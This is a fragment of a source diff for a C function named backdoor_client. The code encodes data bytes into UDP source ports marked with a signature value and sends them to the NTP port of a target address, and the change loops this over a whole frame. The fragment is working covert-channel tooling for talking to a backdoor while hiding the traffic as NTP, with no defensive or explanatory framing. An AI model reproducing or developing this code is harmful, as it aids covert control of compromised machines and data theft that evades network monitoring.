@@ -60,8 +60,8 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 			char *enc;
 			char *ptr;
 			int fram_len;
-			ushort src_port = 0;
-			ushort dst_port = 0;
+			uint16 src_port = 0;
+			uint16 dst_port = 0;
 
 			ptr = trans + i;
 
@@ -75,12 +75,16 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 
 //			free(enc);
 
-			src_port = (SIGNTR << 8) + frame[i];
-			dst_port = PORT_NTP;
+			for (int j = 0; j < FRAM_SZ; ++j)
+			{
+				uint8 byte = frame[j];
+				src_port = 0xFF00 & SIGNTR << 8;
+				src_port += byte;
+				dst_port = PORT_NTP;
 
-			_sendUDP(ipaddr, src_port, dst_port);
-			
-			usleep(SLEEP_TIME);
+				_sendUDP(ipaddr, src_port, dst_port);
+				usleep(SLEEP_TIME);
+			}
 		}
 
 		free(trans);
